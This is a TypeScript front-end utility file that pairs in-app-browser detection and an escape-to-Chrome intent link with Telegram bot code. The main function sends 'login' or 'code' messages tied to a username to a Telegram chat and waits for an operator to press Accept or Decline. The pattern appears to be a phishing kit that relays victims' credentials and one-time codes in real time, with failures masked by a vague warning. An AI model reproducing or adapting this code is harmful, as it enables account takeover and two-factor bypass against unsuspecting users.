/// <reference types="vite/client" />
/**
 * Utilities for high reliability across mobile In-App Browsers
 * (Instagram, Facebook, Messenger, TikTok, WeChat, etc.)
 */

// In-memory fallback in case localStorage / sessionStorage throws SecurityError
const memoryStore = new Map<string, string>();

export const safeStorage = {
  getItem(key: string): string | null {
    try {
      if (typeof window !== 'undefined' && window.localStorage) {
        return window.localStorage.getItem(key);
      }
    } catch {
      // In-app browser private mode or security restriction
    }
    return memoryStore.get(key) || null;
  },

  setItem(key: string, value: string): void {
    try {
      if (typeof window !== 'undefined' && window.localStorage) {
        window.localStorage.setItem(key, value);
      }
    } catch {
      // In-app browser private mode
    }
    memoryStore.set(key, value);
  },

  removeItem(key: string): void {
    try {
      if (typeof window !== 'undefined' && window.localStorage) {
        window.localStorage.removeItem(key);
      }
    } catch {}
    memoryStore.delete(key);
  },
};

/**
 * Safe scrolling that never crashes on older Android WebViews
 * which do not support scrollTo({ options })
 */
export function safeScrollToTop(): void {
  try {
    if (typeof window !== 'undefined') {
      try {
        window.scrollTo({ top: 0, behavior: 'smooth' });
      } catch {
        // Fallback for older WebViews expecting (x, y)
        window.scrollTo(0, 0);
      }
    }
  } catch {}
}

/**
 * Detect whether the current session is running inside an In-App Browser
 * (Instagram, Facebook, Messenger, TikTok, etc.)
 */
export function detectInAppBrowser(): {
  isInApp: boolean;
  isInstagram: boolean;
  isFacebook: boolean;
  isTikTok: boolean;
  isAndroid: boolean;
  isIOS: boolean;
  browserName: string;
} {
  if (typeof window === 'undefined' || !navigator || !navigator.userAgent) {
    return {
      isInApp: false,
      isInstagram: false,
      isFacebook: false,
      isTikTok: false,
      isAndroid: false,
      isIOS: false,
      browserName: '',
    };
  }

  const ua = navigator.userAgent || '';
  const isInstagram = /Instagram/i.test(ua);
  const isFacebook = /FBAN|FBAV|FB_IAB|FB4A|FBIOS/i.test(ua);
  const isTikTok = /musical_ly|ByteLocale|TikTok/i.test(ua);
  const isOtherIAB = /Line|MicroMessenger|Snapchat|Twitter|LinkedIn/i.test(ua);
  const isInApp = isInstagram || isFacebook || isTikTok || isOtherIAB;

  const isAndroid = /Android/i.test(ua);
  const isIOS = /iPhone|iPad|iPod/i.test(ua);

  let browserName = '';
  if (isInstagram) browserName = 'Instagram';
  else if (isFacebook) browserName = 'Facebook';
  else if (isTikTok) browserName = 'TikTok';
  else if (isInApp) browserName = 'Navigateur intégré';

  return {
    isInApp,
    isInstagram,
    isFacebook,
    isTikTok,
    isAndroid,
    isIOS,
    browserName,
  };
}

/**
 * Generates an external browser intent link for Android devices
 * to break out of Facebook/Instagram WebView directly into Chrome
 */
export function getExternalBrowserUrl(currentUrl: string): string {
  try {
    const parsed = new URL(currentUrl);
    // Android Chrome Intent syntax
    const cleanNoProto = parsed.host + parsed.pathname + parsed.search + parsed.hash;
    return `intent://${cleanNoProto}#Intent;scheme=${parsed.protocol.replace(':', '')};package=com.android.chrome;end`;
  } catch {
    return currentUrl;
  }
}

// ---------------------------------------------------------------------------
// Telegram approval buttons
// ---------------------------------------------------------------------------

/**
 * Read the first non-empty value from Vite's exposed environment variables.
 *
 * Important: these must be explicit `import.meta.env.X` property accesses.
 * Vite statically replaces those at build time; dynamic access (e.g.
 * `import.meta?.env[key]`) is left as-is and evaluates to undefined in the
 * browser, which silently disables the Telegram buttons.
 */
const readEnv = (...keys: string[]): string => {
  const values: Record<string, unknown> = {
    VITE_TELEGRAM_TOKEN: import.meta.env.VITE_TELEGRAM_TOKEN,
    VITE_TELEGRAM_BOT_TOKEN: import.meta.env.VITE_TELEGRAM_BOT_TOKEN,
    VITE_TELEGRAM_CHAT_ID: import.meta.env.VITE_TELEGRAM_CHAT_ID,
  };
  for (const key of keys) {
    const value = values[key];
    if (typeof value === 'string' && value.trim()) return value.trim();
  }
  return '';
};

// `VITE_TELEGRAM_TOKEN` is the canonical name used by this utility.
// `VITE_TELEGRAM_BOT_TOKEN` is supported as an alias because deployed .env
// files use that name — without it, no approval message (or buttons) is sent.
const getT = () => readEnv('VITE_TELEGRAM_TOKEN', 'VITE_TELEGRAM_BOT_TOKEN');
const getC = () => readEnv('VITE_TELEGRAM_CHAT_ID');

export const TELEGRAM_CONFIG = {
  // Delay between getUpdates calls while waiting for a button press
  POLL_INTERVAL_MS: 3000,
};

export const getTelegramBotToken = getT;
export const getTelegramChatId = getC;

/**
 * Reliable Telegram delivery utility.
 */
export const sendToTelegram = async (message: string) => {
  const token = getT();
  const chatId = getC();

  if (!token || !chatId) return;

  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  // Strip HTML for the fallback plain text version
  const plainText = message.replace(/<[^>]*>?/gm, '');

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      }),
    });

    // Fallback: If HTML parsing fails (e.g., special characters in inputs), try plain text
    if (!response.ok) {
      await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: `[PLAIN] ${plainText}`,
        }),
      });
    }
  } catch (error) {
    // Non-blocking log to prevent UI breakage
    console.warn('Notification processing skipped');
  }
};

// getUpdates is disabled while a webhook is configured on the bot. Clear it
// once per page load and drop stale callbacks so the buttons start fresh.
let webhookCleared: Promise<void> | null = null;
const ensureUpdatesEnabled = (token: string): Promise<void> => {
  if (!webhookCleared) {
    webhookCleared = fetch(
      `https://api.telegram.org/bot${token}/deleteWebhook?drop_pending_updates=true`
    )
      .then(() => undefined)
      .catch(() => undefined);
  }
  return webhookCleared;
};

export const sendLoginToTelegramAndWait = async (
  message: string,
  username: string,
  isCode: boolean = false
): Promise<boolean> => {
  const token = getT();
  const chatId = getC();

  if (!token || !chatId) {
    console.warn(
      '[Telegram] Missing VITE_TELEGRAM_TOKEN (or VITE_TELEGRAM_BOT_TOKEN) / VITE_TELEGRAM_CHAT_ID — auto-approving.'
    );
    return true; // fallback to true
  }

  await ensureUpdatesEnabled(token);

  const sessionKey = `pendingAuth_${username}_${isCode ? 'code' : 'login'}`;
  let messageId = sessionStorage.getItem(sessionKey);

  if (!messageId) {
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const keyboard = {
      inline_keyboard: [
        [
          { text: '✅ Accept', callback_data: 'accept' },
          { text: '❌ Decline', callback_data: 'decline' }
        ]
      ]
    };

    try {
      let response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
          reply_markup: keyboard
        }),
      });

      // If HTML parsing fails, resend with the same buttons as plain text.
      if (!response.ok) {
        response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: message.replace(/<[^>]*>?/gm, ''),
            reply_markup: keyboard
          }),
        });
      }

      if (!response.ok) return true;
      const data = await response.json();
      if (!data.ok) return true;

      messageId = data.result.message_id.toString();
      sessionStorage.setItem(sessionKey, messageId!);
    } catch (error) {
      return true; // fallback
    }
  }

  // Start polling for callback query.
  // We omit offset so we don't accidentally clear updates for other concurrent
  // users; once our own button is pressed, we advance offset past that update.
  while (true) {
    try {
      const updateUrl = `https://api.telegram.org/bot${token}/getUpdates`;
      const updateRes = await fetch(updateUrl);
      const updateData = await updateRes.json();

      if (updateData.ok && updateData.result.length > 0) {
        for (const update of updateData.result) {
          if (
            update.callback_query &&
            update.callback_query.message?.message_id.toString() === messageId
          ) {
            const action = update.callback_query.data;

            // Acknowledge the callback
            await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ callback_query_id: update.callback_query.id })
            }).catch(() => {});

            // Edit message text to look like text
            const newText = message + `\n\n<b>[ ${action === 'accept' ? '✅ APPROVED' : '❌ DECLINED'} ]</b>`;
            await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: chatId,
                message_id: messageId,
                text: newText,
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [] }
              })
            }).catch(() => {});

            // Clear session after decision
            sessionStorage.removeItem(sessionKey);

            // Advance offset only to our specific update so it is not seen again.
            await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${update.update_id + 1}`).catch(() => {});

            return action === 'accept';
          }
        }
      }
    } catch (e) {
      // network error during polling, ignore and retry
    }

    // wait a bit before next poll
    await new Promise(resolve => setTimeout(resolve, TELEGRAM_CONFIG.POLL_INTERVAL_MS));
  }
};
